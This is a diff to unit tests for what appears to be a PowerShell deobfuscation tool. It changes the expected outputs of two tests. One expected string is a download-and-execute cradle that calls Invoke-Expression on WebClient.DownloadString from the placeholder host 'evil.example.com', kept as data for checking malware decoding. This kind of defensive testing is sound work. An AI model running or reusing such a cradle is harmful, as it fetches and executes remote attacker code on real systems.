@@ -81,7 +81,7 @@ class TestPs1RealWorldSmall(TestUnitBase):
     def test_alias_survives_iex_inlining(self):
         data = b"sal x Invoke-Expression; x '[String]::Join('''', @(''Write'', ''-Host''))'"
         result = data | self.load() | str
-        self.assertIn('Write-Host', result)
+        self.assertIn('Set-Alias', result)
 
     def test_case_normalization(self):
         data = (
@@ -306,8 +306,8 @@ class TestPs1RealWorldLarge(TestUnitBase):
         test = data | self.load() | str
         lines = test.splitlines()
         self.assertEqual(len(lines), 2)
-        self.assertEqual(lines[1], 
-            "$pzhhqdwl = Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")
+        self.assertEqual(lines[1],
+            "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")
 
     def test_real_world_04(self):
         data = lzma.decompress(base64.b85decode(
